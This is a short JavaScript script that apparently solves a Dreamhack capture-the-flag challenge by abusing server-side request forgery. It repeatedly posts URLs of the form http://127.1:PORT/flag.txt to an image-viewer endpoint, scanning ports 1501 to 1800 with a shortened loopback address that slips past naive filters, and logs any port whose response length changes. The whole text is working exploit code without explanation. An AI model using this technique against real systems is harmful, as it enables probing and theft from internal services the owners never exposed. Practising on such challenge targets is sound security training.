for (let port = 1501; port < 1801; port++) {
  const data = new FormData();
  data.append("url", `http://127.1:${port}/flag.txt`);

  fetch("http://host3.dreamhack.games:13283/img_viewer", {
    method: "POST",
    body: data,
  })
    .then((res) => {
      return res.text();
    })
    .then((data) => {
      if (data.length != 65121) {
        console.log(port);
      }
    });
}
